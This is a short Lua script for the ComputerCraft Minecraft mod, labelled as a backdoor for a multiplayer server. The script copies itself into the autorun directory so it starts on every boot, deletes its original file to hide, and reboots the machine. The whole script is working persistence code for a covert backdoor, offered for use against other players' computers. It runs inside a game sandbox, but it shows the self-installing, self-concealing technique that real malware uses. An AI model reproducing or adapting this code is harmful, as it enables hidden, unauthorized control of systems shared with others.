-- computer craft SMP backdoor!
if not fs.exists("/rom/autorun/backdoor.lua") then
local pwd = shell.getRunningProgram();
local _self = fs.open(pwd, "r");
local file = fs.open("/rom/autorun/backdoor.lua", "w");
file.write(_self.readAll());
_self.close();
file.close();
fs.delete(pwd); -- Hopefully deletes the script
os.reboot();
end
-- This is how I make the backdoor auto run
